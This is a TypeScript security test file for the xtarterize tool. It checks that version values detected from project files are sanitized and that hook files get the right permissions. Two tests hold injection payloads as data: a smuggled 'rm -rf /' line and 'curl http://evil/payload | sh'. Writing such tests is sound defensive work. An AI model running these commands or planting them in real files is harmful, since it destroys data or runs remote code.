import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { detectProject, writeFile } from '@xtarterize/core';
import { isExecutableFile, writeTaskDiffs } from '@xtarterize/tasks';
import { describe, expect } from 'vite-plus/test';

describe('security: profile value sanitization', () => {
  test('nodeVersion contains only digits from engines.node', async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
    try {
      await fs.writeFile(
        path.join(tmpDir, 'package.json'),
        JSON.stringify({
          engines: { node: '>=18.0.0' },
          name: 'test',
        })
      );
      const profile = await detectProject(tmpDir);
      expect(profile.nodeVersion).toMatch(/^\d+$/);
    } finally {
      await fs.rm(tmpDir, { force: true, recursive: true });
    }
  });

  test('nodeVersion extracts digits from malicious engines.node', async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
    try {
      await fs.writeFile(
        path.join(tmpDir, 'package.json'),
        JSON.stringify({
          engines: {
            node: "22'\n      run: rm -rf /\n      ",
          },
          name: 'test',
        })
      );
      const profile = await detectProject(tmpDir);
      expect(profile.nodeVersion).toMatch(/^\d+$/);
      expect(profile.nodeVersion).not.toContain('\n');
      expect(profile.nodeVersion).not.toContain("'");
    } finally {
      await fs.rm(tmpDir, { force: true, recursive: true });
    }
  });

  test('nodeVersion extracts digits from malicious .nvmrc', async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
    try {
      await fs.writeFile(
        path.join(tmpDir, 'package.json'),
        JSON.stringify({ name: 'test' })
      );
      await fs.writeFile(
        path.join(tmpDir, '.nvmrc'),
        '22\nrun: curl http://evil/payload | sh\n'
      );
      const profile = await detectProject(tmpDir);
      expect(profile.nodeVersion).toMatch(/^\d+$/);
      expect(profile.nodeVersion).not.toContain('\n');
    } finally {
      await fs.rm(tmpDir, { force: true, recursive: true });
    }
  });

  test('packageManager is restricted to known values', async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
    try {
      await fs.writeFile(
        path.join(tmpDir, 'package.json'),
        JSON.stringify({ name: 'test' })
      );
      const profile = await detectProject(tmpDir);
      expect(['pnpm', 'npm', 'yarn', 'bun']).toContain(profile.packageManager);
    } finally {
      await fs.rm(tmpDir, { force: true, recursive: true });
    }
  });
});

describe('security: husky hook file permissions', () => {
  test('isExecutableFile detects hook files', async () => {
    expect(isExecutableFile('.husky/commit-msg')).toBe(true);
    expect(isExecutableFile('.husky/pre-commit')).toBe(true);
    expect(isExecutableFile('.vite-hooks/pre-push')).toBe(true);
    expect(isExecutableFile('package.json')).toBe(false);
    expect(isExecutableFile('src/index.ts')).toBe(false);
  });

  test('writeTaskDiffs creates hook files as executable', async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
    try {
      await writeTaskDiffs(tmpDir, [
        {
          after: '#!/bin/sh\npnpm lint\n',
          before: null,
          filepath: '.husky/pre-commit',
        },
      ]);

      const stat = await fs.stat(path.join(tmpDir, '.husky', 'pre-commit'));
      const isExecutable = (stat.mode & 0o111) !== 0;
      expect(isExecutable).toBe(true);
    } finally {
      await fs.rm(tmpDir, { force: true, recursive: true });
    }
  });

  test('writeTaskDiffs creates regular files as non-executable', async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
    try {
      await writeTaskDiffs(tmpDir, [
        {
          after: 'root = true\n',
          before: null,
          filepath: '.editorconfig',
        },
      ]);

      const stat = await fs.stat(path.join(tmpDir, '.editorconfig'));
      const isExecutable = (stat.mode & 0o111) !== 0;
      expect(isExecutable).toBe(false);
    } finally {
      await fs.rm(tmpDir, { force: true, recursive: true });
    }
  });
});

describe('security: writeFile mode parameter', () => {
  test('writeFile with mode creates file with correct permissions', async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
    try {
      const filePath = path.join(tmpDir, 'script.sh');
      await writeFile(filePath, '#!/bin/sh\necho hi\n', 0o755);

      const stat = await fs.stat(filePath);
      const isExecutable = (stat.mode & 0o111) !== 0;
      expect(isExecutable).toBe(true);
    } finally {
      await fs.rm(tmpDir, { force: true, recursive: true });
    }
  });

  test('writeFile without mode creates non-executable file', async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
    try {
      const filePath = path.join(tmpDir, 'note.txt');
      await writeFile(filePath, 'hello');

      const stat = await fs.stat(filePath);
      const isExecutable = (stat.mode & 0o111) !== 0;
      expect(isExecutable).toBe(false);
    } finally {
      await fs.rm(tmpDir, { force: true, recursive: true });
    }
  });
});
